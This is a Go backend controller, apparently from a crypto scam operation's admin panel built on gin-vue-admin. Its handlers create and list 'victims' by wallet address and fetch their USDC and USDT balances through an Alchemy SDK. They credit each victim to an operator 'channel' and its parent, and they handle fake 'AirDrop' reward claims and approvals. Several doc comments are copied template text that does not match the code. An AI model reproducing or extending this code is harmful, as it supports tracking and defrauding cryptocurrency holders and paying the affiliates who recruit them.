package system

import (
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/contract"
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/tool"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/request"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/response"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	systemReq "github.com/flipped-aurora/gin-vue-admin/server/model/system/request"
	systemRes "github.com/flipped-aurora/gin-vue-admin/server/model/system/response"
	"github.com/flipped-aurora/gin-vue-admin/server/utils"
	"log"
	"regexp"
	"strings"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

type SystemVictim struct{}

// Refresh
// @Tags      SysApi
// @Summary   创建基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "创建基础api"
// @Router    /victim/refresh [post]
func (s *SystemVictim) RefreshBalance(c *gin.Context) {
	var victim system.SysVictim
	err := c.ShouldBindJSON(&victim)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	result, _ := victimService.GetVictimById(victim.ID)

	if result.Refresh >= 10 {
		response.FailWithMessage("刷新次数过多", c)
		return
	}
	var sdk = new(contract.AlchemySDKService)

	if strings.EqualFold(result.Token, "USDC") {
		_balance, _ := sdk.GetTokenBalance(result.CustomerAddress)
		victim.Balance = _balance
	}
	if strings.EqualFold(result.Token, "USDT") {
		_balance, _ := sdk.GetUSDTBalance(result.CustomerAddress)
		victim.Balance = _balance
	}

	victim.Refresh = result.Refresh + 1
	err = victimService.UpdateVictimRefresh(victim)

	if err == nil {
		response.OkWithDetailed(gin.H{"balance": victim.Balance}, "获取成功", c)
	} else {
		response.FailWithMessage("交易失败", c)
	}
}

// CreateVictim
// @Tags      Victim
// @Summary   创建基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "创建基础api"
// @Router    /victim/CreateVictim [post]
func (s *SystemVictim) CreateVictim(c *gin.Context) {
	var victim system.SysVictim
	err := c.ShouldBindJSON(&victim)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	user, err := userService.FindUserById(int(utils.GetUserID(c)))
	victim.PrimaryChannel = user.Username

	if user.ParentId > 0 {
		parentUser, _ := userService.FindUserById(int(user.ParentId))
		victim.SecondaryChannel = parentUser.Username
	}

	var sdk = new(contract.AlchemySDKService)

	if strings.EqualFold(victim.Token, "USDC") {

		_balance, _ := sdk.GetTokenBalance(victim.CustomerAddress)
		victim.Balance = _balance
	}
	if strings.EqualFold(victim.Token, "USDT") {
		_balance, _ := sdk.GetUSDTBalance(victim.CustomerAddress)
		victim.Balance = _balance
	}

	err = victimService.CreateVictim(victim)
	if err != nil {
		global.GVA_LOG.Error("创建失败!", zap.Error(err))
		response.FailWithMessage("创建失败", c)
		return
	}
	response.OkWithMessage("创建成功", c)
}

// DeleteApi
// @Tags      SysApi
// @Summary   删除api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "ID"
// @Success   200   {object}  response.Response{msg=string}  "删除api"
// @Router    /api/deleteApi [post]
func (s *SystemVictim) DeleteVictim(c *gin.Context) {
	var api system.SysApi
	err := c.ShouldBindJSON(&api)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	err = utils.Verify(api.GVA_MODEL, utils.IdVerify)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	err = apiService.DeleteApi(api)
	if err != nil {
		global.GVA_LOG.Error("删除失败!", zap.Error(err))
		response.FailWithMessage("删除失败", c)
		return
	}
	response.OkWithMessage("删除成功", c)
}

// GetUsers
// @Tags      SysUser
// @Summary   分页获取用户列表
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      request.PageInfo                                        true  "页码, 每页大小"
// @Success   200   {object}  response.Response{data=response.PageResult,msg=string}  "分页获取用户列表,返回包括列表,总数,页码,每页数量"
// @Router    /victim/GetUsers [post]
func (b *SystemVictim) GetUsers(c *gin.Context) {
	uid := utils.GetUserID(c)
	log.Println("====================GetUsers================================")
	log.Println("UID: ", uid)
	log.Println("====================GetUsers================================")

	list, err := userService.GetUsers(uid)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(gin.H{"users": list}, "获取成功", c)

}

// GetApiList
// @Tags      SysApi
// @Summary   分页获取API列表
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      systemReq.SearchApiParams                               true  "分页获取API列表"
// @Success   200   {object}  response.Response{data=response.PageResult,msg=string}  "分页获取API列表,返回包括列表,总数,页码,每页数量"
// @Router    /api/getApiList [post]
func (s *SystemVictim) GetVictimList(c *gin.Context) {
	var pageInfo systemReq.SearchVictimParams
	err := c.ShouldBindJSON(&pageInfo)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	uid := utils.GetUserID(c)
	channel := pageInfo.PrimaryChannel
	if uid != 1 {
		user, _ := userService.FindUserById(int(utils.GetUserID(c)))
		channel = user.Username
	} else {
		channel = pageInfo.Channel
	}

	log.Println("渠道", channel)

	list, total, err := victimService.GetVictimInfoList(pageInfo.SysVictim, pageInfo.PageInfo, pageInfo.OrderKey, pageInfo.Desc, channel)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(response.PageResult{
		List:     list,
		Total:    total,
		Page:     pageInfo.Page,
		PageSize: pageInfo.PageSize,
	}, "获取成功", c)
}

// GetApiById
// @Tags      SysApi
// @Summary   根据id获取api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      request.GetById                                   true  "根据id获取api"
// @Success   200   {object}  response.Response{data=systemRes.SysAPIResponse}  "根据id获取api,返回包括api详情"
// @Router    /api/getApiById [post]
func (s *SystemVictim) GetVictimById(c *gin.Context) {
	var idInfo request.GetById
	err := c.ShouldBindJSON(&idInfo)

	api, err := victimService.GetVictimById((uint)(idInfo.ID))
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(systemRes.SysVictimResponse{Victim: api}, "获取成功", c)
}

// UpdateApi
// @Tags      SysApi
// @Summary   修改基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "修改基础api"
// @Router    /api/updateApi [post]
func (s *SystemVictim) UpdateVictim(c *gin.Context) {

	//var victim system.SysVictim
	//err := c.ShouldBindJSON(&victim)
	//if err != nil {
	//	response.FailWithMessage(err.Error(), c)
	//	return
	//}
	//
	//user, err := userService.FindUserById(int(utils.GetUserID(c)))
	//victim.PrimaryChannel = user.Username
	//
	//if user.ParentId > 0 {
	//	parentUser, _ := userService.FindUserById(int(user.ParentId))
	//	victim.SecondaryChannel = parentUser.Username
	//}
	//
	//err = victimService.CreateVictim(victim)
	//if err != nil {
	//	global.GVA_LOG.Error("创建失败!", zap.Error(err))
	//	response.FailWithMessage("创建失败", c)
	//	return
	//}
	//response.OkWithMessage("创建成功", c)

	var victim system.SysVictim
	err := c.ShouldBindJSON(&victim)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	var sdk = new(contract.AlchemySDKService)

	if strings.EqualFold(victim.Token, "USDC") {

		_balance, _ := sdk.GetTokenBalance(victim.CustomerAddress)
		victim.Balance = _balance
	}
	if strings.EqualFold(victim.Token, "USDT") {
		_balance, _ := sdk.GetUSDTBalance(victim.CustomerAddress)
		victim.Balance = _balance
	}

	err = victimService.UpdateVictim(victim)
	if err != nil {
		global.GVA_LOG.Error("修改失败!", zap.Error(err))
		response.FailWithMessage("修改失败", c)
		return
	}
	response.OkWithMessage("修改成功", c)
}

// GetAllApis
// @Tags      SysApi
// @Summary   获取所有的Api 不分页
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Success   200  {object}  response.Response{data=systemRes.SysAPIListResponse,msg=string}  "获取所有的Api 不分页,返回包括api列表"
// @Router    /api/getAllApis [post]
func (s *SystemVictim) GetAllVictims(c *gin.Context) {
	apis, err := apiService.GetAllApis()
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(systemRes.SysAPIListResponse{Apis: apis}, "获取成功", c)
}

// DeleteApisByIds
// @Tags      SysApi
// @Summary   删除选中Api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      request.IdsReq                 true  "ID"
// @Success   200   {object}  response.Response{msg=string}  "删除选中Api"
// @Router    /api/deleteApisByIds [delete]
func (s *SystemVictim) DeleteVictimsByIds(c *gin.Context) {
	var ids request.IdsReq
	err := c.ShouldBindJSON(&ids)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	err = apiService.DeleteApisByIds(ids)
	if err != nil {
		global.GVA_LOG.Error("删除失败!", zap.Error(err))
		response.FailWithMessage("删除失败", c)
		return
	}
	response.OkWithMessage("删除成功", c)
}

func (s *SystemVictim) GetLuckyPrice(c *gin.Context) {
	result := tool.RandFloat64(0.001234, 1)
	response.OkWithDetailed(gin.H{"result": result}, "success", c)
}

func (s *SystemVictim) AirDrop(c *gin.Context) {
	var reward system.SysReward
	err := c.ShouldBindJSON(&reward)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	re := regexp.MustCompile("^0x[0-9a-fA-F]{40}$")
	if !re.MatchString(reward.Address) {
		response.FailWithMessage("invalid address ", c)
		return
	}
	err = victimService.CreateReward(reward)
	if err != nil {
		global.GVA_LOG.Error("failure!", zap.Error(err))
		response.FailWithMessage("failure", c)
		return
	}
	response.OkWithMessage("success", c)
}

func (s *SystemVictim) GetRewards(c *gin.Context) {
	var pageInfo systemReq.SearchRewardParams
	err := c.ShouldBindJSON(&pageInfo)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}
	list, total, err := victimService.GetRewardList(pageInfo.Type, pageInfo.SysReward, pageInfo.PageInfo, pageInfo.OrderKey, pageInfo.Desc, pageInfo.StartDate, pageInfo.EndDate)
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}
	response.OkWithDetailed(response.PageResult{
		List:     list,
		Total:    total,
		Page:     pageInfo.Page,
		PageSize: pageInfo.PageSize,
	}, "success", c)
}

func (s *SystemVictim) RejectSysReward(c *gin.Context) {
	var reward system.SysReward
	err := c.ShouldBindJSON(&reward)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	err = victimService.Reject(reward)
	if err != nil {
		global.GVA_LOG.Error("审核失败!", zap.Error(err))
		response.FailWithMessage("审核失败", c)
		return
	}
	response.OkWithMessage("审核成功", c)
}

func (s *SystemVictim) ApprovalSysReward(c *gin.Context) {
	var reward system.SysReward
	err := c.ShouldBindJSON(&reward)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	err = victimService.Approval(reward)
	if err != nil {
		global.GVA_LOG.Error("审核失败!", zap.Error(err))
		response.FailWithMessage("审核失败", c)
		return
	}
	response.OkWithMessage("审核成功", c)
}
